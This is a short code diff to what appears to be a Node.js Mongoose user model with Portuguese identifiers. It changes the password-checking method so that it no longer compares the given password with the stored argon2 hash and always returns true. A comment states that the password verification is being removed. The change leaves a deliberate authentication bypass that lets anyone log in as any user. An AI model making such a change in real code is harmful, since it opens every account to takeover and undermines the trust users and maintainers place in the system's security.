@@ -39,7 +39,8 @@ usuarioSchema.methods.fazerCheckin = function () {
 
 usuarioSchema.methods.verificarSenha = async function (senha) {
     try {
-        return await argon2.compare(senha, this.senha);
+        // Removendo a verificação da senha
+        return true;
     } catch (error) {
         console.log(error);
         return false;
